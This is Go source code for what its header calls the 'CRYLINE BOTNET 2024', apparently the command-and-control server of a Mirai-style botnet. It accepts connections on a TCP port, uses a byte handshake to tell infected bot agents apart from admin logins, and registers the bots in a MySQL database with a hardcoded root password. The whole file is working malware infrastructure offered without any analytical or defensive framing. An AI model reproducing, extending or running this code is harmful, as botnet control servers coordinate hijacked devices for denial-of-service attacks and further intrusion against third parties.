/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

package main

import (
    "fmt"
    "net"
    "time"
)

const __MYSQL_RHOST string = "127.0.0.1:3306"
const __MYSQL_USER string = "root"
const __MYSQL_PASSWORD string = "g0123011G!"
const __MYSQL_DATABASE string = "cryline"

var __AGENT_LIST *ClientList = __NEW_AGENT_LIST()
var __DATABASE *Database = __BOTNET_DATABASE(__MYSQL_RHOST, __MYSQL_USER, __MYSQL_PASSWORD, __MYSQL_DATABASE)

func main() {
    _TELNET_CONNECTION, _GET_ERROR := net.Listen("tcp", "192.168.0.110:18916")

    if _GET_ERROR != nil {
        fmt.Println(_GET_ERROR)

        return
    }

    for {
        _CONNECTION, _GET_ERROR := _TELNET_CONNECTION.Accept()

        if _GET_ERROR != nil {
            break
        }

        go __INIT_HANDLER(_CONNECTION)
    }
}

func __INIT_HANDLER(_CONNECTION net.Conn) {

    defer _CONNECTION.Close()

    _CONNECTION.SetDeadline(time.Now().Add(10 * time.Second))

    _BUFFER := make([]byte, 32)

    _GET_LOCAL_COUNTER, _GET_ERROR := _CONNECTION.Read(_BUFFER)

    if _GET_ERROR != nil || _GET_LOCAL_COUNTER <= 0 {
        return
    }

    if _GET_LOCAL_COUNTER == 4 && _BUFFER[0] == 0x00 && _BUFFER[1] == 0x00 && _BUFFER[2] == 0x00 {

        if _BUFFER[3] > 0 {
            _STRING_LENGHT := make([]byte, 1)

            _GET_LOCAL_COUNTER, _GET_ERROR := _CONNECTION.Read(_STRING_LENGHT)

            if _GET_ERROR != nil || _GET_LOCAL_COUNTER <= 0 {
                return
            }

            var _SOURCE string

            if _STRING_LENGHT[0] > 0 {
                _GET_SOURCE_BUFFER := make([]byte, _STRING_LENGHT[0])

                _GET_LOCAL_COUNTER, _GET_ERROR := _CONNECTION.Read(_GET_SOURCE_BUFFER)

                if _GET_ERROR != nil || _GET_LOCAL_COUNTER <= 0 {
                    return
                }

                _SOURCE = string(_GET_SOURCE_BUFFER)
            }

            __GET_NEW_AGENT(_CONNECTION, _BUFFER[3], _SOURCE).Handle()

        } else {
            __GET_NEW_AGENT(_CONNECTION, _BUFFER[3], "").Handle()
        }
    } else {
        __CREATE_NEW_ADMIN(_CONNECTION).Handle()
    }
}


func __READ_BYTES(_CONNECTION net.Conn, _BUFFER []byte) (error) {
    _GET_TL := 0

    for _GET_TL < len(_BUFFER) {
        _SETTER, _GET_ERROR := _CONNECTION.Read(_BUFFER[_GET_TL:])

        if _GET_ERROR != nil {
            return _GET_ERROR
        }

        if _SETTER <= 0 {
            return _GET_ERROR
        }

        _GET_TL += _SETTER
    }

    return nil
}

func netshift(_PREFIX uint32, _NETMASK uint8) uint32 {
    return uint32(_PREFIX >> (32 - _NETMASK))
}
